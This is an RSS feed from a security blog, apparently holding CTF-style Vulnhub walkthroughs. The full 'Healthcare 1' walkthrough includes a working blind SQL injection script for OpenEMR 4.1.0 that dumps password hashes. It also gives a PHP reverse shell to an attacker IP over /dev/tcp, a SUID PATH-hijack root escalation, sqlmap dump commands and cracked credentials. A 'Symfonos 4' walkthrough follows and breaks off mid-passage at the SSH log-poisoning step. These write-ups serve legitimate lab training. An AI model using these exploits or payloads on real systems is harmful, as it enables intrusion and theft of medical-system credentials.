@@ -1,0 +1,595 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Intermediate on ikuamike</title><link>https://blog.ikuamike.io/tags/intermediate/</link><description>Recent content in Intermediate on ikuamike</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><copyright>© Michael Ikua</copyright><lastBuildDate>Sat, 03 Apr 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://blog.ikuamike.io/tags/intermediate/index.xml" rel="self" type="application/rss+xml"/><item><title>Vulnhub: Healthcare 1</title><link>https://blog.ikuamike.io/posts/2021/healthcare1/</link><pubDate>Sat, 03 Apr 2021 00:00:00 +0000</pubDate><guid>https://blog.ikuamike.io/posts/2021/healthcare1/</guid><description/><content>&lt;img src="https://blog.ikuamike.io/img/healthcare1/healthcare.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>Difficulty&lt;/th>
+&lt;th>Release Date&lt;/th>
+&lt;th>Author&lt;/th>
+&lt;th>Machine link&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>Intermediate&lt;/td>
+&lt;td>29 Jul 2020&lt;/td>
+&lt;td>v1n1v131r4&lt;/td>
+&lt;td>&lt;a href="https://vulnhub.com/entry/healthcare-1,522/">https://vulnhub.com/entry/healthcare-1,522/&lt;/a>&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;h1 id="summary">Summary&lt;/h1>
+&lt;p>For this box, we perform directory bruteforce on the webserver to discover a vulnerable version of openemr. Openemr here
+is vulnerable to sql injection that we leverage to extract usernames and password hashes. After cracking the hashes, we use the
+discovered credentials to access the ftp server and upload a php reverse shell to the webserver. This serves as our initial
+entry. To escalate our privileges we abuse a suid binary that doesn&amp;rsquo;t use absolute path in commands it&amp;rsquo;s running,
+therefore we can hijack any of those commands and run any commands of our choosing as root.&lt;/p>
+&lt;h1 id="reconnaissance">Reconnaissance&lt;/h1>
+&lt;p>Nmap&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 192.168.56.106
+Host is up &lt;span style="color:#f92672">(&lt;/span>0.00023s latency&lt;span style="color:#f92672">)&lt;/span>.
+PORT STATE SERVICE VERSION
+21/tcp open ftp ProFTPD 1.3.3d
+80/tcp open http Apache httpd 2.2.17 &lt;span style="color:#f92672">((&lt;/span>PCLinuxOS 2011/PREFORK-1pclos2011&lt;span style="color:#f92672">))&lt;/span>
+| http-robots.txt: &lt;span style="color:#ae81ff">8&lt;/span> disallowed entries
+| /manual/ /manual-2.2/ /addon-modules/ /doc/ /images/
+|_/all_our_e-mail_addresses /admin/ /
+|_http-server-header: Apache/2.2.17 &lt;span style="color:#f92672">(&lt;/span>PCLinuxOS 2011/PREFORK-1pclos2011&lt;span style="color:#f92672">)&lt;/span>
+|_http-title: Coming Soon &lt;span style="color:#ae81ff">2&lt;/span>
+Service Info: OS: Unix
+&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="enumeration">Enumeration&lt;/h1>
+&lt;h2 id="21-ftp">21 (FTP)&lt;/h2>
+&lt;p>Anonymous access is not enabled and the server version isn&amp;rsquo;t vulnerable to any known vulnerabilities.
+We can look at this again when we have credentials.&lt;/p>
+&lt;h2 id="80-http">80 (HTTP)&lt;/h2>
+&lt;p>Accessing this on the browser, we only get a static site with not much functionality.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/healthcare1/healthcare-2.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>When we perform a directory bruteforce we get the following results:&lt;/p>
+&lt;pre>&lt;code>ffuf -ic -c -u 'http://192.168.56.106/FUZZ' -e / -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 100 -fc 403 | tee -a healthcare1.ffuf
+&lt;/code>&lt;/pre>
+&lt;img src="https://blog.ikuamike.io/img/healthcare1/healthcare-1.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>After checking the directories we have discovered, openemr returns an application. From their website:&lt;/p>
+&lt;blockquote>
+&lt;p>OpenEMR is the most popular open source electronic health records and medical practice management solution.&lt;/p>
+&lt;/blockquote>
+&lt;img src="https://blog.ikuamike.io/img/healthcare1/healthcare-3.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>This version of openemr is outdated. Searching for available vulnerabilities and exploits for this version using searchsploit,
+we discover an sql injection vulnerability.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/healthcare1/healthcare-4.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>Unfortunately the PoC provided doesn&amp;rsquo;t work. I found a better one from packetstormsecurity:&lt;/p>
+&lt;p>&lt;a href="https://packetstormsecurity.com/files/108328/OpenEMR-4.1.0-SQL-Injection.html">https://packetstormsecurity.com/files/108328/OpenEMR-4.1.0-SQL-Injection.html&lt;/a>&lt;/p>
+&lt;p>The PoC provided shows a blind sql injection. The below payload causes the request to delay for about 5 seconds.&lt;/p>
+&lt;pre>&lt;code>http://192.168.56.106/openemr/interface/login/validateUser.php?u='%2b(SELECT%201%20FROM%20(SELECT%20SLEEP(25))A)%2b'
+&lt;/code>&lt;/pre>&lt;p>Using this, I was able to create a script to extract username and password hash of all existing users. Soon to be
+submitted to exploit-db.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
+&lt;span style="color:#75715e"># Exploit Title: OpenEMR 4.1.0 - SQL Injection&lt;/span>
+&lt;span style="color:#75715e"># Date: 2021-04-03&lt;/span>
+&lt;span style="color:#75715e"># Exploit Author: Michael Ikua&lt;/span>
+&lt;span style="color:#75715e"># Vendor Homepage: https://www.open-emr.org/&lt;/span>
+&lt;span style="color:#75715e"># Software Link: https://github.com/openemr/openemr/archive/refs/tags/v4_1_0.zip&lt;/span>
+&lt;span style="color:#75715e"># Version: 4.1.0&lt;/span>
+&lt;span style="color:#75715e"># Original Advisory: https://www.netsparker.com/web-applications-advisories/sql-injection-vulnerability-in-openemr/&lt;/span>
+&lt;span style="color:#f92672">import&lt;/span> requests
+&lt;span style="color:#f92672">import&lt;/span> string
+&lt;span style="color:#f92672">import&lt;/span> sys
+&lt;span style="color:#66d9ef">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;&amp;#34;&amp;#34;
+&lt;/span>&lt;span style="color:#e6db74"> ____ ________ _______ __ __ ___ ____
+&lt;/span>&lt;span style="color:#e6db74"> / __ \____ ___ ____ / ____/ |/ / __ \ / // / &amp;lt; // __ &lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">
+&lt;/span>&lt;span style="color:#e6db74"> / / / / __ \/ _ \/ __ \/ __/ / /|_/ / /_/ / / // /_ / // / / /
+&lt;/span>&lt;span style="color:#e6db74">/ /_/ / /_/ / __/ / / / /___/ / / / _, _/ /__ __/ / // /_/ /
+&lt;/span>&lt;span style="color:#e6db74">\____/ .___/\___/_/ /_/_____/_/ /_/_/ |_| /_/ (_)_(_)____/
+&lt;/span>&lt;span style="color:#e6db74"> /_/
+&lt;/span>&lt;span style="color:#e6db74"> ____ ___ __ _____ ____ __ _
+&lt;/span>&lt;span style="color:#e6db74"> / __ )/ (_)___ ____/ / / ___// __ \ / / (_)
+&lt;/span>&lt;span style="color:#e6db74"> / /_/ / / / __ \/ __ / \__ \/ / / / / / / /
+&lt;/span>&lt;span style="color:#e6db74"> / /_/ / / / / / / /_/ / ___/ / /_/ / / /___/ /
+&lt;/span>&lt;span style="color:#e6db74">/_____/_/_/_/ /_/\__,_/ /____/\___\_\/_____/_/ exploit by @ikuamike
+&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&amp;#34;&amp;#34;&lt;/span>)
+all &lt;span style="color:#f92672">=&lt;/span> string&lt;span style="color:#f92672">.&lt;/span>printable
+&lt;span style="color:#75715e"># edit url to point to your openemr instance&lt;/span>
+url &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;http://192.168.56.106/openemr/interface/login/validateUser.php?u=&amp;#34;&lt;/span>
+&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">extract_users_num&lt;/span>():
+&lt;span style="color:#66d9ef">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[+] Finding number of users...&amp;#34;&lt;/span>)
+&lt;span style="color:#66d9ef">for&lt;/span> n &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">1&lt;/span>,&lt;span style="color:#ae81ff">100&lt;/span>):
+payload &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\&amp;#39;&lt;/span>&lt;span style="color:#e6db74">%2b(SELECT+if((select count(username) from users)=&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> str(n) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#39;,sleep(3),1))%2b&lt;/span>&lt;span style="color:#ae81ff">\&amp;#39;&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>
+r &lt;span style="color:#f92672">=&lt;/span> requests&lt;span style="color:#f92672">.&lt;/span>get(url&lt;span style="color:#f92672">+&lt;/span>payload)
+&lt;span style="color:#66d9ef">if&lt;/span> r&lt;span style="color:#f92672">.&lt;/span>elapsed&lt;span style="color:#f92672">.&lt;/span>total_seconds() &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>:
+user_length &lt;span style="color:#f92672">=&lt;/span> n
+&lt;span style="color:#66d9ef">break&lt;/span>
+&lt;span style="color:#66d9ef">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[+] Found number of users: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> str(user_length))
+&lt;span style="color:#66d9ef">return&lt;/span> user_length
+&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">extract_users&lt;/span>():
+users &lt;span style="color:#f92672">=&lt;/span> extract_users_num()
+&lt;span style="color:#66d9ef">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[+] Extracting username and password hash...&amp;#34;&lt;/span>)
+output &lt;span style="color:#f92672">=&lt;/span> []
+&lt;span style="color:#66d9ef">for&lt;/span> n &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">1&lt;/span>,&lt;span style="color:#ae81ff">1000&lt;/span>):
+payload &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\&amp;#39;&lt;/span>&lt;span style="color:#e6db74">%2b(SELECT+if(length((select+group_concat(username,&lt;/span>&lt;span style="color:#ae81ff">\&amp;#39;&lt;/span>&lt;span style="color:#e6db74">:&lt;/span>&lt;span style="color:#ae81ff">\&amp;#39;&lt;/span>&lt;span style="color:#e6db74">,password)+from+users+limit+0,1))=&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> str(n) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#39;,sleep(3),1))%2b&lt;/span>&lt;span style="color:#ae81ff">\&amp;#39;&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>
+&lt;span style="color:#75715e">#print(payload)&lt;/span>
+r &lt;span style="color:#f92672">=&lt;/span> requests&lt;span style="color:#f92672">.&lt;/span>get(url&lt;span style="color:#f92672">+&lt;/span>payload)
+&lt;span style="color:#75715e">#print(r.request.url)&lt;/span>
+&lt;span style="color:#66d9ef">if&lt;/span> r&lt;span style="color:#f92672">.&lt;/span>elapsed&lt;span style="color:#f92672">.&lt;/span>total_seconds() &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>:
+length &lt;span style="color:#f92672">=&lt;/span> n
+&lt;span style="color:#66d9ef">break&lt;/span>
+&lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">1&lt;/span>,length&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>):
+&lt;span style="color:#66d9ef">for&lt;/span> char &lt;span style="color:#f92672">in&lt;/span> all:
+payload &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\&amp;#39;&lt;/span>&lt;span style="color:#e6db74">%2b(SELECT+if(ascii(substr((select+group_concat(username,&lt;/span>&lt;span style="color:#ae81ff">\&amp;#39;&lt;/span>&lt;span style="color:#e6db74">:&lt;/span>&lt;span style="color:#ae81ff">\&amp;#39;&lt;/span>&lt;span style="color:#e6db74">,password)+from+users+limit+0,1),&amp;#39;&lt;/span>&lt;span style="color:#f92672">+&lt;/span> str(i)&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#e6db74">&amp;#39;,1))=&amp;#39;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>str(ord(char))&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#e6db74">&amp;#39;,sleep(3),1))%2b&lt;/span>&lt;span style="color:#ae81ff">\&amp;#39;&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>
+&lt;span style="color:#75715e">#print(payload)&lt;/span>
+r &lt;span style="color:#f92672">=&lt;/span> requests&lt;span style="color:#f92672">.&lt;/span>get(url&lt;span style="color:#f92672">+&lt;/span>payload)
+&lt;span style="color:#75715e">#print(r.request.url)&lt;/span>
+&lt;span style="color:#66d9ef">if&lt;/span> r&lt;span style="color:#f92672">.&lt;/span>elapsed&lt;span style="color:#f92672">.&lt;/span>total_seconds() &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>:
+output&lt;span style="color:#f92672">.&lt;/span>append(char)
+&lt;span style="color:#66d9ef">if&lt;/span> char &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;,&amp;#34;&lt;/span>:
+&lt;span style="color:#66d9ef">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>)
+&lt;span style="color:#66d9ef">continue&lt;/span>
+&lt;span style="color:#66d9ef">print&lt;/span>(char, end&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>, flush&lt;span style="color:#f92672">=&lt;/span>True)
+&lt;span style="color:#66d9ef">try&lt;/span>:
+extract_users()
+&lt;span style="color:#66d9ef">except&lt;/span> &lt;span style="color:#a6e22e">KeyboardInterrupt&lt;/span>:
+&lt;span style="color:#66d9ef">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>)
+&lt;span style="color:#66d9ef">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[+] Exiting...&amp;#34;&lt;/span>)
+sys&lt;span style="color:#f92672">.&lt;/span>exit()
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>After running the script, we get the hashes of 2 users.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/healthcare1/healthcare-5.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;pre>&lt;code>admin : 3863efef9ee2bfbc51ecdca359c6302bed1389e8
+medical : ab24aed5a7c4ad45615cd7e0da816eea39e4895d
+&lt;/code>&lt;/pre>&lt;p>We can try crack these hashes using hashcat/john the ripper but using crackstation.net would be quicker.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/healthcare1/healthcare-6.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>Now we have passwords for both users.&lt;/p>
+&lt;pre>&lt;code>admin : ackbar
+medical : medical
+&lt;/code>&lt;/pre>&lt;h1 id="shell-as-apache">Shell as apache&lt;/h1>
+&lt;p>With this credentials, let&amp;rsquo;s get back to ftp. Only the credentials for medical user work.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/healthcare1/healthcare-7.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>On ftp we see that we have access to the file system as the medical user, and we can even access
+the web server directory.&lt;/p>
+&lt;p>Due to the permissions set we can only write to openemr directory. With this, we can upload a php file that will provide
+a reverse shell.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/healthcare1/healthcare-8.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>Contents of revshell.php:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span> &lt;span style="color:#a6e22e">system&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;/bin/bash -c &amp;#39;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.56.1/9000 0&amp;gt;&amp;amp;1 &amp;amp;&amp;#39;&amp;#34;&lt;/span>); &lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
+&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Making a request to the uploaded file using curl, we get the reverse shell.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/healthcare1/healthcare-9.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>After spawning a proper tty shell with python, we can switch to the medical user. In the Documents folder there&amp;rsquo;s a
+Passwords.txt but the root creds don&amp;rsquo;t work.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/healthcare1/healthcare-10.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;h1 id="shell-as-root">Shell as root&lt;/h1>
+&lt;p>Checking for usual privesc techniques like suid binaries by using find command we get one unusual binary.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">find / -perm -4000 -ls 2&amp;gt;/dev/null
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/healthcare1/healthcare-11.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>After running healthcheck, it outputs some system information like disks.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/healthcare1/healthcare-12.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>To understand what exactly it&amp;rsquo;s doing, we run strings on this binary. From this we identify ways to abuse this since
+it doesn&amp;rsquo;t use absolute paths on the commands it runs, therefore it will use what it finds from our PATH variable.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/healthcare1/healthcare-13.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>I&amp;rsquo;ll use ifconfig here with my own code and place it in the /tmp folder and update my PATH variable. When this ifconfig
+is executed it will created a copy of the bash binary which has suid permissions.&lt;/p>
+&lt;p>Contents of ifconfig:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">&lt;span style="color:#75715e">#!/bin/sh
+&lt;/span>&lt;span style="color:#75715e">&lt;/span>cp /bin/bash /tmp/suidbash;chmod u+s /tmp/suidbash
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/healthcare1/healthcare-14.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>We can then run the suidbash binary with -p to preserve the privileges and get root privileges and read the final
+root.txt.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/healthcare1/healthcare-15.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>After getting root I found I has skipped over user.txt in almirant&amp;rsquo;s home directory&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/healthcare1/healthcare-16.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;h1 id="extras">Extras&lt;/h1>
+&lt;p>After looking at other writeups, I discovered other possible paths for exploiting this
+machine.&lt;/p>
+&lt;p>Initial step needed was exploiting the sql injection. Using sqlmap would have been a quicker way
+and achieved the same results. I intentionally didn&amp;rsquo;t use sqlmap on my initial exploitation.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">sqlmap -u &lt;span style="color:#e6db74">&amp;#34;http://192.168.56.106/openemr/interface/login/validateUser.php?u=&amp;#34;&lt;/span> --batch --dump -T users -C username,password
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/healthcare1/healthcare-25.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>Using the obtained credentials, we can login to openemr as administrator and we can either upload a php file or
+edit existing php files for command execution.&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;h4 id="file-upload">File upload&lt;/h4>
+&lt;/li>
+&lt;/ul>
+&lt;img src="https://blog.ikuamike.io/img/healthcare1/healthcare-17.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>The file upload functionality does not have restrictions, therefore we can upload our php reverse shell and it will
+be stored in that images directory.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/healthcare1/healthcare-18.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>We can the trigger the reverse shell by visiting the revshell.php in the /openemr/sites/default/images/ directory.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/healthcare1/healthcare-19.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>Reverse shell obtained.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/healthcare1/healthcare-20.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;ul>
+&lt;li>
+&lt;h4 id="edit-existing-php-files">Edit existing php files&lt;/h4>
+&lt;/li>
+&lt;/ul>
+&lt;p>Using the same files functionality, we can also perform edits to existing files. In this case we can edit config.php
+and add our reverse shell payload. After saving it and refreshing the page, a reverse shell is obtained on netcat
+listener.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/healthcare1/healthcare-24.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>Another possible path that would have been taken after initial shell was that, the shadow file in the
+/var/backups directory was world readable.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/healthcare1/healthcare-21.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>Therefore we can crack this hash and switch user to almirant.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/healthcare1/healthcare-22.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>Then we get user.txt.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/healthcare1/healthcare-23.png" alt="symfonos" class="center" style="border-radius: 8px;" /></content></item><item><title>Vulnhub: Symfonos 4</title><link>https://blog.ikuamike.io/posts/2021/symfonos4/</link><pubDate>Mon, 15 Feb 2021 00:00:00 +0000</pubDate><guid>https://blog.ikuamike.io/posts/2021/symfonos4/</guid><description/><content>&lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos1.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>Difficulty&lt;/th>
+&lt;th>Release Date&lt;/th>
+&lt;th>Author&lt;/th>
+&lt;th>Machine link&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>Intermediate&lt;/td>
+&lt;td>20 Aug 2019&lt;/td>
+&lt;td>Zayotic&lt;/td>
+&lt;td>&lt;a href="https://vulnhub.com/entry/symfonos-4,347/">https://vulnhub.com/entry/symfonos-4,347/&lt;/a>&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;h1 id="summary">Summary&lt;/h1>
+&lt;p>For this box, some directory bruteforce is needed to discover some php files. One of the php files has an lfi
+vulnerability but can only be access by authenticating to the other page. The login form can be bypassed and
+we exploit the lfi. For that we poison ssh logs for exploitation to rce. For privilege escalation we exploit
+a python web app running locally as root using insecure deserialization of the cookie by jsonpickle.&lt;/p>
+&lt;h1 id="reconnaissance">Reconnaissance&lt;/h1>
+&lt;p>Nmap&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 192.168.56.105
+Host is up &lt;span style="color:#f92672">(&lt;/span>0.00033s latency&lt;span style="color:#f92672">)&lt;/span>.
+PORT STATE SERVICE VERSION
+22/tcp open ssh OpenSSH 7.9p1 Debian &lt;span style="color:#ae81ff">10&lt;/span> &lt;span style="color:#f92672">(&lt;/span>protocol 2.0&lt;span style="color:#f92672">)&lt;/span>
+| ssh-hostkey:
+| &lt;span style="color:#ae81ff">2048&lt;/span> f9:c1:73:95:a4:17:df:f6:ed:5c:8e:8a:c8:05:f9:8f &lt;span style="color:#f92672">(&lt;/span>RSA&lt;span style="color:#f92672">)&lt;/span>
+| &lt;span style="color:#ae81ff">256&lt;/span> be:c1:fd:f1:33:64:39:9a:68:35:64:f9:bd:27:ec:01 &lt;span style="color:#f92672">(&lt;/span>ECDSA&lt;span style="color:#f92672">)&lt;/span>
+|_ &lt;span style="color:#ae81ff">256&lt;/span> 66:f7:6a:e8:ed:d5:1d:2d:36:32:64:39:38:4f:9c:8a &lt;span style="color:#f92672">(&lt;/span>ED25519&lt;span style="color:#f92672">)&lt;/span>
+80/tcp open http Apache httpd 2.4.38 &lt;span style="color:#f92672">((&lt;/span>Debian&lt;span style="color:#f92672">))&lt;/span>
+|_http-server-header: Apache/2.4.38 &lt;span style="color:#f92672">(&lt;/span>Debian&lt;span style="color:#f92672">)&lt;/span>
+|_http-title: Site doesn&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>t have a title &lt;span style="color:#f92672">(&lt;/span>text/html&lt;span style="color:#f92672">)&lt;/span>.
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="enumeration">Enumeration&lt;/h1>
+&lt;h2 id="http-80">HTTP (80)&lt;/h2>
+&lt;p>On the browser, the only thing that is served is an image. Therefore we need to bruteforce for directories
+and files.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-26.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>Performing a bruteforce with ffuf we get a &lt;strong>gods&lt;/strong> directory.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">ffuf -ic -c -u http://192.168.56.105/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e / -fc &lt;span style="color:#ae81ff">403&lt;/span> | tee root.ffuf
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-2.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>In this directory we only have some files, with nothing useful in them.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-1.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>The contents:&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-3.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>I decided to use the contents of the files to generate a wordlist for more bruteforce using curl.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-4.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>With this new words I performed bruteforce again but adding extensions.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-6.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>From this we discover &lt;strong>sea.php&lt;/strong> .&lt;/p>
+&lt;p>When we try to visit this file, we get redirected to atlantis.php which has a login form.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-7.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>On this form if we submit random creds, then visit sea.php afterwards. We are able to access it. I think this
+behaviour is related to the cookies the app sends after trying to login.&lt;/p>
+&lt;p>The sea.php has form that loads files based on the god we select. The contents are the log files we discovered
+in /gods. Based on this behaviour we can try and exploit lfi to get rce.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-10.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>Since the on the url we are passing hades, and it loads content of hades.log. We can assume it appends .log
+to our input. This restricts us to only loading log files, but that should be sufficient for lfi to rce.&lt;/p>
+&lt;p>After testing a few log files I could only access auth.log which is located in /var/log/auth.log. These are ssh logs.&lt;/p>
+&lt;h1 id="getting-shell-as-www-data">Getting shell as www-data&lt;/h1>
+&lt;p>Let&amp;rsquo;s poison the ssh log by add php code in the username for rce.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-12.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>We can pass the command id to test if we were successful.&lt;/p>
